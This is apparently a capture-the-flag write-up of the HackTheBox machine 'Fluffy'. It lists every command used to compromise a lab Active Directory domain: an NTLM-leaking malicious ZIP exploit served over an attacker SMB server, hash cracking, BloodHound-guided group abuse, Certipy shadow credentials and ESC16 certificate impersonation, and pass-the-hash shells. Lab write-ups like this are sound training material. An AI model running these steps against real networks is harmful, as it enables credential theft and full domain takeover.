---
title: "Fluffy"
date: 2025-05-24
retire_date: 9999-09-09
tags: ["htb", "Windows", "Easy", "Assume Breach"]
difficulty: "Easy"
base_points: 20
event: "HackTheBox"
Author: "ruycr4ft & kavigihan"
cover:
  image: "/images/ctf/htb/fluffy.png"
  alt: "Cat Machine"
  relative: true
---

{{< machine-info-shortcode >}}

## Walkthrough

Easy - Windows

We are provided with initial credentials: j.fleischman / J0elTHEM4n1990!

## Enum

as we have provided with creds, it is logical to go ahead and check smb share and access

### nxc

We use NetExec (nxc) to enumerate the available shares:

```bash
nxc smb 10.10.11.69 -u users -p pass --shares
```

there's unusual IT share and luckily we have read access

{{< figure src="/images/ctf/htb/Pasted image 20250524203643.png" alt="interception" caption=" " align="center" >}}


so many interesting files there

```bash
smbclient \\\\fluffy.htb\\IT -U 'j.fleischman'%'J0elTHEM4n1990!'
```
{{<newline>}}
{{< figure src="/images/ctf/htb/Pasted image 20250524203715.png" alt="interception" caption=" " align="center" >}}


### PDF
got every zip and PDF files

{{< figure src="/images/ctf/htb/Pasted image 20250524203821.png" alt="interception" caption=" " align="center" >}}


PDF does says about some CVEs and with simple search we can tell that we have to use second CVE cause first is SQLi and second is one where we create zip file and upload it on the victim and get NTLM hash

and we have creds and ability to READ,WRITE over share so this is a perfect attack vector to escalate

## user.txt

We leverage the published exploit:
https://github.com/ThemeHackers/CVE-2025-24071

```bash
python3 exploit.py -i 10.10.14.7 -f evil
```

{{< figure src="/images/ctf/htb/Pasted image 20250524204140.png" alt="interception" caption=" " align="center" >}}


This creates the malicious ZIP, which we then serve using an SMB server:

started smbserver and uploaded that .zip file

```bash
sudo impacket-smbserver share ./share -smb2support
```

{{< figure src="/images/ctf/htb/Pasted image 20250524204222.png" alt="interception" caption=" " align="center" >}}



#### crack the hash

Once the victim connects, we capture NTLM hashes:

{{< figure src="/images/ctf/htb/Pasted image 20250524204238.png" alt="interception" caption=" " align="center" >}}



```bash
john hash --wordlist=~/Desktop/rockyou.txt
```

{{< figure src="/images/ctf/htb/Pasted image 20250524204450.png" alt="interception" caption=" " align="center" >}}


### bloodhound

With new credentials, it’s time to map out Active Directory privileges.

We spin up BloodHound CE using Docker:

```bash
curl -L https://ghst.ly/getbhce -o docker-compose.yml
sudo docker-compose up -d
```

{{< figure src="/images/ctf/htb/Pasted image 20250525122810.png" alt="interception" caption=" " align="center" >}}


BloodHound reveals that the p.agila user has GenericAll rights over the Service Accounts group. That means we can add ourselves into the group and abuse the privileges


```bash
bloodyAD --host 10.10.11.69 -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' add groupMember 'Service Accounts' p.agila
```

verify that

```bash
ldapsearch -x -H ldap://10.10.11.69 -D "fluffy\\p.agila" -w 'prometheusx-303' \
-b "CN=Service Accounts,CN=Users,DC=fluffy,DC=htb" "(objectClass=group)" member
```

### winrm_svc

now to get user flag, we have to get winrm_svc hash

created venv for certipy
Using Certipy’s shadow credentials attack:

```bash
certipy shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account winrm_svc
```

{{< figure src="/images/ctf/htb/Pasted image 20250525135055.png" alt="interception" caption=" " align="center" >}}


```bash
evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

## root.txt

For domain escalation, we abuse an Active Directory Certificate Services (ADCS) misconfiguration — ESC16.
According to the Certipy wiki on ESC16, this issue arises when security extensions are disabled globally on the CA. This allows an attacker to shadow service accounts and request certificates that grant escalated privileges.

[ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)

We begin by targeting the ca_svc account using Certipy’s shadow credentials attack:

```bash
certipy shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account ca_svc
```

This gives us control over the CA service account. Next, we read the account details:

```bash
certipy account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -user 'ca_svc' read
```

{{< figure src="/images/ctf/htb/Pasted image 20250525135336.png" alt="interception" caption=" " align="center" >}}


Then, we update the UPN mapping to impersonate the Administrator account:

```bash
certipy account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update
```

{{< figure src="/images/ctf/htb/Pasted image 20250525135503.png" alt="interception" caption=" " align="center" >}}


Now that the CA allows us to impersonate Administrator, we request a certificate:

```bash
certipy req -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
```

{{< figure src="/images/ctf/htb/Pasted image 20250525135946.png" alt="interception" caption=" " align="center" >}}


Finally, we authenticate with the certificate and pop a shell as Domain Administrator:
(update upn again if it doesn't work. timing issues)

```bash
certipy account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
```

```bash
certipy auth -pfx administrator.pfx -username 'administrator' -domain 'fluffy.htb' -dc-ip 10.10.11.69
```

{{< figure src="/images/ctf/htb/Pasted image 20250525140028.png" alt="interception" caption=" " align="center" >}}


```bash
evil-winrm -i 10.10.11.69 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```

{{<seperator>}}